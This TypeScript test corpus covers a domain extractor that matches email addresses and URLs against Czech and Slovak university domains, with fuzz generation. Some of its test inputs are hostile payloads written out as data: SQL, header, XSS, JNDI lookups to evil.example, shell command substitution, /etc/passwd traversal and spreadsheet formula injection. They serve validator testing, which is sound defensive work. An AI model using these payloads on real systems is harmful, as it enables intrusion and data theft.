// Shared input corpus for the package tests and for the cross-language tests of the examples.
// Each case: [input, expected extractDomain() result, expected matchSchoolDomain() result].
// SKIP as the host means "do not check the host" (e.g. punycode of a homoglyph); the match is always checked.
// The matches use long-lived university domains (zcu.cz, muni.cz, cuni.cz, stuba.sk), so data updates do not break them.

export const SKIP = Symbol("skip");
export type Case = readonly [input: string, host: string | null | typeof SKIP, match: string | null];

const long = (n: number) => "a".repeat(n);
// host of exactly n characters ending in ".cz" (labels of at most 63 characters)
const hostOfLength = (n: number) => {
  let body = "";
  let left = n - 3; // without ".cz"
  while (left > 64) {
    body += "b".repeat(63) + ".";
    left -= 64;
  }
  return body + "b".repeat(left) + ".cz";
};
const host253 = hostOfLength(253);
const host254 = hostOfLength(254);

export const CASES: Record<string, Case[]> = {
  "what people normally type": [
    ["student@zcu.cz", "zcu.cz", "zcu.cz"],
    ["Student@ZCU.CZ", "zcu.cz", "zcu.cz"],
    ["  student@zcu.cz  ", "zcu.cz", "zcu.cz"],
    ["\tstudent@zcu.cz\r\n", "zcu.cz", "zcu.cz"],
    ["student@zcu.cz.", "zcu.cz", "zcu.cz"],
    ["jan.novak+skola@zcu.cz", "zcu.cz", "zcu.cz"],
    ["jan_novak-2@zcu.cz", "zcu.cz", "zcu.cz"],
    ["123456@mail.muni.cz", "mail.muni.cz", "muni.cz"],
    ["a@student.zcu.cz", "student.zcu.cz", "zcu.cz"],
    ["student@fiit.stuba.sk", "fiit.stuba.sk", "fiit.stuba.sk"],
    ["študent@zcu.cz", "zcu.cz", "zcu.cz"],
    ["Jan Novák <student@zcu.cz>", "zcu.cz", "zcu.cz"],
    ['"Novák, Jan" <student@zcu.cz>', "zcu.cz", "zcu.cz"],
    ['"x@evil.example" <student@zcu.cz>', "zcu.cz", "zcu.cz"],
    ["<student@zcu.cz>", "zcu.cz", "zcu.cz"],
    ["< student@zcu.cz >", "zcu.cz", "zcu.cz"],
    ["mailto:student@zcu.cz", "zcu.cz", "zcu.cz"],
    ["MAILTO:Student@ZCU.cz", "zcu.cz", "zcu.cz"],
    ["<mailto:student@zcu.cz>", "zcu.cz", "zcu.cz"],
    ["@zcu.cz", "zcu.cz", "zcu.cz"],
    ["zcu.cz", "zcu.cz", "zcu.cz"],
    ["ZCU.CZ.", "zcu.cz", "zcu.cz"],
    ["www.zcu.cz", "www.zcu.cz", "zcu.cz"],
    ["student.zcu.cz", "student.zcu.cz", "zcu.cz"],
    ["www.zcu.cz/studium?x=1#top", "www.zcu.cz", "zcu.cz"],
    ["zcu.cz:443", "zcu.cz", "zcu.cz"],
    ["zcu.cz:", "zcu.cz", "zcu.cz"],
    ["https://www.zcu.cz", "www.zcu.cz", "zcu.cz"],
    ["HTTPS://WWW.ZCU.CZ/STUDIUM", "www.zcu.cz", "zcu.cz"],
    ["http://zcu.cz:8080/a/b?c=d#e", "zcu.cz", "zcu.cz"],
    ["https://user:pass@zcu.cz/", "zcu.cz", "zcu.cz"],
    ["https://a@b@zcu.cz/", "zcu.cz", "zcu.cz"],
    ["ftp://zcu.cz/pub", "zcu.cz", "zcu.cz"],
    ["https://zcu.cz?x=a@evil.example", "zcu.cz", "zcu.cz"],
    ["https://evil.example%2f@zcu.cz/", "zcu.cz", "zcu.cz"],
    ["https://evil.example%5c@zcu.cz/", "zcu.cz", "zcu.cz"],
    ["https://www.cuni.cz/UK-1.html", "www.cuni.cz", "cuni.cz"],
  ],
  "Unicode that maps to the same host (copy-paste, IME, fullwidth)": [
    ["\u00a0student@zcu.cz\u00a0", "zcu.cz", "zcu.cz"],
    ["\ufeffstudent@zcu.cz", "zcu.cz", "zcu.cz"],
    ["\u3000student@zcu.cz\u2003", "zcu.cz", "zcu.cz"],
    ["x@zcu\u3002cz", "zcu.cz", "zcu.cz"],
    ["x@zcu\uff0ecz", "zcu.cz", "zcu.cz"],
    ["x@zcu\uff61cz", "zcu.cz", "zcu.cz"],
    ["x@zcu.cz\u3002", "zcu.cz", "zcu.cz"],
    ["x@\uff5a\uff43\uff55.\uff43\uff5a", "zcu.cz", "zcu.cz"],
    ["x@zcu.\u2102\u2124", "zcu.cz", "zcu.cz"],
    ["x@\u24e9\u24d2\u24e4.cz", "zcu.cz", "zcu.cz"],
    ["https://zcu\u3002cz/", "zcu.cz", "zcu.cz"],
    ["x@škola.cz", "xn--kola-f6a.cz", null],
    ["x@ŠKOLA.cz", "xn--kola-f6a.cz", null],
    ["https://škola.cz/kontakt", "xn--kola-f6a.cz", null],
    ["x@xn--kola-f6a.cz", "xn--kola-f6a.cz", null],
  ],
  "valid addresses that are not schools": [
    ["someone@seznam.cz", "seznam.cz", null],
    ["someone@email.cz", "email.cz", null],
    ["someone@post.cz", "post.cz", null],
    ["someone@centrum.cz", "centrum.cz", null],
    ["someone@atlas.cz", "atlas.cz", null],
    ["someone@azet.sk", "azet.sk", null],
    ["someone@zoznam.sk", "zoznam.sk", null],
    ["someone@gmail.com", "gmail.com", null],
    ["someone@outlook.com", "outlook.com", null],
    ["someone@icloud.com", "icloud.com", null],
    ["someone@proton.me", "proton.me", null],
    ["student@zcuplzen.onmicrosoft.com", "zcuplzen.onmicrosoft.com", null],
    ["x@edu.cz", "edu.cz", null],
    ["x@neoverena-skola.edu.cz", "neoverena-skola.edu.cz", null],
    ["x@evilzcu.cz", "evilzcu.cz", null],
    ["x@zcu.com", "zcu.com", null],
    ["x@zcu.c", "zcu.c", null],
    ["x@zcu.cz.evil.example", "zcu.cz.evil.example", null],
    ["x@zcu.cz.nip.io", "zcu.cz.nip.io", null],
    ["x@zcu-cz.example", "zcu-cz.example", null],
    ["https://zcu.cz.evil.example/", "zcu.cz.evil.example", null],
    ["https://evil.example/zcu.cz", "evil.example", null],
    ["https://evil.example/?u=zcu.cz", "evil.example", null],
    ["https://evil.example#@zcu.cz", "evil.example", null],
    ["https://zcu.cz@evil.example/", "evil.example", null],
    ["x@zcu.cz\u3002evil.example", "zcu.cz.evil.example", null],
    ["https://zcu.cz\u3002evil.example/", "zcu.cz.evil.example", null],
    ["studentzcu.cz", "studentzcu.cz", null],
    ["x@constructor.cz", "constructor.cz", null],
    ["x@hasownproperty.cz", "hasownproperty.cz", null],
    ["__proto__@seznam.cz", "seznam.cz", null],
    [`x@${long(63)}.cz`, `${long(63)}.cz`, null],
    [`x@${host253}`, host253, null],
  ],
  "homoglyphs and look-alikes": [
    ["x@z\u0441u.cz", SKIP, null], // Cyrillic es
    ["x@\u0437cu.cz", SKIP, null], // Cyrillic ze
    ["x@zcu.cž", SKIP, null], // z with caron
    ["x@zcú.cz", SKIP, null],
    ["x@zcu.cz\u0301", SKIP, null], // combining acute on the last letter
    ["x@m\u03c5ni.cz", SKIP, null], // Greek upsilon
  ],
  "typos and malformed input": [
    ["", null, null],
    // "xn--" labels that are not valid punycode pass through unchanged (Node.js versions disagree on them);
    // .cz and .sk have no IDN domains, so such a host only matches as a subdomain of a listed school domain
    ["x@xn--kla-f6.cz", "xn--kla-f6.cz", null],
    ["x@zcu.xn--cz", "zcu.xn--cz", null],
    ["student@xn--kla-f6.zcu.cz", "xn--kla-f6.zcu.cz", "zcu.cz"],
    ["https://xn--kla-f6.zcu.cz/", "xn--kla-f6.zcu.cz", "zcu.cz"],
    ["   ", null, null],
    ["\u00a0\u3000", null, null],
    ["@", null, null],
    ["x@", null, null],
    ["student", null, null],
    ["student@", null, null],
    ["student@zcu", null, null],
    ["student@zcu.", null, null],
    ["student@.cz", null, null],
    ["student@cz", null, null],
    ["student@zcu..cz", null, null],
    ["student@zcu.cz..", null, null],
    ["student@.zcu.cz", null, null],
    ["student@-zcu.cz", null, null],
    ["student@zcu-.cz", null, null],
    ["student @zcu.cz", null, null],
    ["student@ zcu.cz", null, null],
    ["student@zcu .cz", null, null],
    ["student@zcu,cz", null, null],
    ["student@zcu;cz", null, null],
    ["student@@zcu.cz", null, null],
    ["student@zcu.cz@", null, null],
    ["zcu.cz@", null, null],
    ["student@zcu.cz:", null, null],
    ["student@zcu.cz:25", null, null],
    ["student@zcu.cz/", null, null],
    ["student@zcu.cz?", null, null],
    ["student@zcu.cz#", null, null],
    ["Student <student@zcu.cz", null, null],
    ["student@zcu.cz>", null, null],
    ["Novák, Jan <student@zcu.cz>", null, null],
    [".zcu.cz", null, null],
    ["zcu.cz..", null, null],
    ["*.zcu.cz", null, null],
    ["x@*.zcu.cz", null, null],
    ["x@_dmarc.zcu.cz", null, null],
    ["x@zcu_cz.cz", null, null],
    ["zcu.cz:abc", null, null],
    ["zcu.cz:80:80", null, null],
    ["//zcu.cz", null, null],
    ["https://", null, null],
    ["https:///zcu.cz", null, null],
    ["https:/zcu.cz", null, null],
    ["http:zcu.cz", null, null],
    ["https://:443/", null, null],
    ["https://zcu.cz:abc/", null, null],
    ["mailto:", null, null],
    ["mailto:zcu.cz?x", null, null],
    [`x@${long(64)}.cz`, null, null],
    [`x@${host254}`, null, null],
    [`${" ".repeat(2040)}x@zcu.cz`, "zcu.cz", "zcu.cz"], // 2048 characters
    [`${" ".repeat(2041)}x@zcu.cz`, null, null], // 2049 characters
    [`${"\u{1f98a}".repeat(1020)}x@zcu.cz`, "zcu.cz", "zcu.cz"], // 2048 UTF-16 code units
    [`${"\u{1f98a}".repeat(1021)}x@zcu.cz`, null, null], // 2050 UTF-16 code units
    ["x\u00a0y@zcu.cz", null, null],
    ["x@zcu\u00a0.cz", null, null],
    ["x\u3000@zcu.cz", null, null],
    [`x@${"a.".repeat(1000)}cz`, null, null],
  ],
  "IP addresses and special hosts": [
    ["x@127.0.0.1", null, null],
    ["x@[127.0.0.1]", null, null],
    ["x@[IPv6:::1]", null, null],
    ["https://127.0.0.1/", null, null],
    ["https://[::1]/", null, null],
    ["https://[::ffff:147.228.1.1]/", null, null],
    ["http://2130706433/", null, null],
    ["http://0x7f.0.0.1/", null, null],
    ["http://127.1/", null, null],
    ["http://017700000001/", null, null],
    ["x@1.2.3.4.5", null, null],
    ["x@zcu.cz.123", null, null],
    ["x@localhost", null, null],
    ["localhost", null, null],
    ["x@cz", null, null],
    ["x@__proto__", null, null],
    ["x@prototype", null, null],
  ],
  "mail would go to another host (bypass attempts)": [
    ["zcu.cz/@evil.example", null, null],
    ["zcu.cz?@evil.example", null, null],
    ["zcu.cz#@evil.example", null, null],
    ["student.zcu.cz/@evil.example", null, null],
    ["www.zcu.cz/@evil.example", null, null],
    ["evil.example/path@zcu.cz", null, null],
    ["evil.example?@zcu.cz", null, null],
    ["//evil.example@zcu.cz", null, null],
    ["a@evil.example@zcu.cz", null, null],
    ["a@zcu.cz@evil.example", null, null],
    ["@evil.example:a@zcu.cz", null, null],
    ["@evil.example,@relay.example:a@zcu.cz", null, null],
    ["evil.example:a@zcu.cz", null, null],
    ["group:a@zcu.cz;", null, null],
    ['"x@zcu.cz/"@evil.example', null, null],
    ['"a@zcu.cz"@evil.example', null, null],
    ['"x"@zcu.cz', null, null],
    ['"x@zcu.cz"', null, null],
    ["a@evil.example, <b@zcu.cz>", null, null],
    ["a@evil.example,b@zcu.cz", null, null],
    ["a@evil.example;b@zcu.cz", null, null],
    ["a@zcu.cz;b@evil.example", null, null],
    ["<a@evil.example> <b@zcu.cz>", null, null],
    ["a@zcu.cz <b@evil.example>", null, null],
    ['"zcu.cz" <a@evil.example>', "evil.example", null],
    ["zcu.cz <a@evil.example>", "evil.example", null],
    ["a@evil.example(@zcu.cz/)", null, null],
    ["(a@zcu.cz)a@evil.example", null, null],
    ["a@zcu.cz (comment)", null, null],
    ["a@evil.example,x.zcu.cz", null, null],
    ["x@[zcu.cz]", null, null],
    ["https://evil.example\\@zcu.cz", null, null],
    ["https:evil.example\\@zcu.cz", null, null],
    ["ws://evil.example\\@zcu.cz", null, null],
    ["HTTPS://EVIL.EXAMPLE\\@ZCU.CZ", null, null],
    ["https://evil.example\t@zcu.cz", null, null],
    ["https://evil.example\n@zcu.cz", null, null],
    ["https://evil.example @zcu.cz", null, null],
    ["x@zcu.cz\\ä.evil.example", null, null],
    ["mailto:b@zcu.cz?cc=a@evil.example", null, null],
    ["mailto:b@zcu.cz?bcc=a@evil.example", null, null],
    ["mailto:a@evil.example,b@zcu.cz", null, null],
    ["mailto:b@zcu.cz?subject=hi", null, null],
    ["mailto:b@zcu.cz#x", null, null],
    ["mailto:a%40evil.example@zcu.cz", null, null],
    ["mailto:?to=b@zcu.cz", null, null],
    ["mailto:mailto:b@zcu.cz", null, null],
    ["a@evil.example\u0000.zcu.cz", null, null],
    ["a@evil.example\nzcu.cz", null, null],
    ["x@zcu.cz:evil.example", null, null],
    ["x@zcu.cz%40evil.example", null, null],
    ["x@zcu.cz%2eevil.example", null, null],
    ["https://zcu.cz%2eevil.example/", null, null],
    ["https://zcu.cz%40evil.example/", null, null],
    ["https://zcu%2ecz/", null, null],
    ["https://zcu%2ecz.škola.cz/", null, null],
    ["https://zcu.cz%2f.škola.cz/", null, null],
    ["x@škola.cz%2e", null, null],
    ["x@zcu.cz%2eš", null, null],
    ["https://škola.cz:x/", null, null],
    ["x@147.228.1.1", null, null],
    ["x@zcu.cz\uff0fevil", null, null],
    ["x@zcu\uff0ecz\uff20evil.example", null, null],
    ["x\uff20zcu.cz", null, null],
    ["x@evil.example\uff20zcu.cz", null, null],
    ["x@zcu.cz\uff1a25", null, null],
    ["x@zcu.cz\uff03x", null, null],
  ],
  "invisible, bidi and control characters": [
    ["x@zcu.cz\u0000", null, null],
    ["x\u0000@zcu.cz", null, null],
    ["x@zcu.cz\u0007", null, null],
    ["x@zcu.cz\u007f", null, null],
    ["x@zcu.cz\u0085", null, null],
    ["x@zc\u200bu.cz", null, null],
    ["x@zcu.cz\u200b", null, null],
    ["\u200bx@zcu.cz", null, null],
    ["x@z\u00adcu.cz", null, null],
    ["x@zcu\u200c.cz", null, null],
    ["x@zcu\u200d.cz", null, null],
    ["x@zcu.cz\u200e", null, null],
    ["x@zcu.cz\u202e", null, null],
    ["x\u202e@zcu.cz", null, null],
    ["\u202ezc.ucz@x", null, null],
    ["x\u2066@zcu.cz", null, null],
    ["x@zcu\u2060.cz", null, null],
    ["x@zcu.cz\ufe0f", null, null],
    ["x@zcu.cz\u{e0041}", null, null],
    ["x@zc\u034fu.cz", null, null],
    ["x@zcu.cz\ufff9", null, null],
    ["https://zc\u200bu.cz/", null, null],
    ["https://zcu.cz\u202e/", null, null],
    ["zc\u00adu.cz", null, null],
  ],
  "injection payloads: rejected because the host part is not a host": [
    ["student@zcu.cz' OR '1'='1", null, null],
    ["student@zcu.cz'--", null, null],
    ["'; DROP TABLE users;--@zcu.cz", null, null],
    ["student@zcu.cz\r\nBcc: victim@evil.example", null, null],
    ["student@zcu.cz\nX-Injected: 1", null, null],
    ["student@zcu.cz%0d%0abcc:a@evil.example", null, null],
    ["%0d%0abcc:a@evil.example", null, null],
    ["<script>alert(1)</script>@zcu.cz", null, null],
    ["student@zcu.cz<script>alert(1)</script>", null, null],
    ['"><img src=x onerror=alert(1)>@zcu.cz', null, null],
    ["javascript:alert(1)//@zcu.cz", null, null],
    ["data:text/html,<script>alert(1)</script>@zcu.cz", null, null],
    ["${jndi:ldap://evil.example/a}@zcu.cz", null, null],
    ["$(id)@zcu.cz", null, null],
    ["x@zcu.cz|id", null, null],
    ["x@zcu.cz&&id", null, null],
    ["x@zcu.cz;id", null, null],
    ["x@zcu.cz`id`", null, null],
    ["x@$(hostname).zcu.cz", null, null],
    ["../../etc/passwd", null, null],
    ["x@zcu.cz/../../etc/passwd", null, null],
    ["file:///etc/passwd", null, null],
    ["=cmd|' /C calc'!A0@zcu.cz", null, null],
    ['=HYPERLINK("http://evil.example")@zcu.cz', null, null],
    ["@SUM(1+1)@zcu.cz", null, null],
    ["{{7*7}}@zcu.cz.{{7*7}}", null, null],
    ["x@zcu.cz%00", null, null],
    ["x@zcu.cz\\", null, null],
    ["x@zcu.cz\u0000.evil.example", null, null],
  ],
  "only the domain is checked: the local part is passed through (escape it yourself)": [
    ["student'--@zcu.cz", "zcu.cz", "zcu.cz"],
    ["{{7*7}}@zcu.cz", "zcu.cz", "zcu.cz"],
    ["${7*7}@zcu.cz", "zcu.cz", "zcu.cz"],
    ["`id`@zcu.cz", "zcu.cz", "zcu.cz"],
    ["=1+1@zcu.cz", "zcu.cz", "zcu.cz"],
    ["+1@zcu.cz", "zcu.cz", "zcu.cz"],
    ["__proto__@zcu.cz", "zcu.cz", "zcu.cz"],
    ["a%evil.example@zcu.cz", "zcu.cz", "zcu.cz"], // "percent hack": still delivered to zcu.cz first
    ["evil.example!a@zcu.cz", "zcu.cz", "zcu.cz"], // UUCP bang path: still delivered to zcu.cz first
    ["a..b@zcu.cz", "zcu.cz", "zcu.cz"],
  ],
  "URLs: the scheme is not validated (a match is not a safe link)": [
    ["javascript://zcu.cz/%0aalert(1)", "zcu.cz", "zcu.cz"],
    ["file://zcu.cz/etc/passwd", "zcu.cz", "zcu.cz"],
    ["chrome-extension://zcu.cz/", "zcu.cz", "zcu.cz"],
  ],
};

export const ALL_CASES: Case[] = Object.values(CASES).flat();

// ---------- deterministic fuzz inputs ----------

export function prng(seed: number) {
  return () => {
    seed |= 0;
    seed = (seed + 0x6d2b79f5) | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

export const PIECES = [
  "zcu.cz", "zcu.cz", "muni.cz", "evil.example", "evil.example", "student", "www.", "@", "@", "@", ".", ".", "/", "?", "#",
  "\\", ",", ";", ":", "<", ">", '"', "(", ")", "[", "]", " ", "\t", "\n", "\r", "\u0000", "%", "%40", "%2e", "%2f",
  "mailto:", "https://", "http://", "ftp://", "//", "\u3002", "\uff0e", "\uff20", "\uff0f", "\uff1a", "\uff5a\uff43\uff55",
  "š", "ŠKOLA", "\u200b", "\u202e", "\u00a0", "\ufeff", "\u00ad", "\u2102\u2124", "-", "xn--", "127.0.0.1", ":443",
  "8080", "'", "`", "$(", "{{", "*", "!", "&", "=", "+", "~", "\u0130", "\u00df", "\u03c2", "\u0441", "\u0085", "\u2028",
  "\ud800", "\u{1f98a}", "\u0627", "a", "1", "-", "_", "..", "@@", "<>", "\"\"",
];

const SEEDS = ALL_CASES.map(([input]) => input).filter((s) => s.length < 200);

/** Random concatenations of PIECES, plus mutations of corpus inputs (insert, delete, duplicate, case-swap). */
export function fuzzInputs(seed: number, count: number): string[] {
  const rnd = prng(seed);
  const pick = <T>(a: readonly T[]) => a[Math.floor(rnd() * a.length)]!;
  const out: string[] = [];
  while (out.length < count) {
    if (rnd() < 0.5) {
      let s = "";
      const n = 1 + Math.floor(rnd() * 9);
      for (let i = 0; i < n; i++) s += pick(PIECES);
      out.push(s);
    } else {
      let s = pick(SEEDS);
      const n = 1 + Math.floor(rnd() * 3);
      for (let i = 0; i < n; i++) {
        const at = Math.floor(rnd() * (s.length + 1));
        const op = rnd();
        if (op < 0.5) s = s.slice(0, at) + pick(PIECES) + s.slice(at);
        else if (op < 0.7) s = s.slice(0, at) + s.slice(at + 1);
        else if (op < 0.85) s = s.slice(0, at) + s.slice(at, at + 1) + s.slice(at);
        else s = s.slice(0, at) + s.slice(at, at + 3).toUpperCase() + s.slice(at + 3);
      }
      out.push(s);
    }
  }
  return out;
}
